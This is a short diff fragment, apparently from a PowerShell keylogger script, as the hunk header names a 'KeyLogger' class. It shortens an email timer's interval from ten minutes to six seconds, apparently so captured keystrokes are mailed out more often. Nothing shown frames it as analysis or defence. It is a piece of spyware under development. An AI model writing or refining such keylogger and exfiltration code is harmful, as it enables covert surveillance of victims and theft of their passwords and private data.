@@ -53,7 +53,7 @@ public class KeyLogger {
 
 
 $EmailTimer = New-Object Timers.Timer
-$EmailTimer.Interval = 600000  
+$EmailTimer.Interval = 6000 
 $EmailTimer.AutoReset = $true
 $EmailTimer.Enabled = $true
 
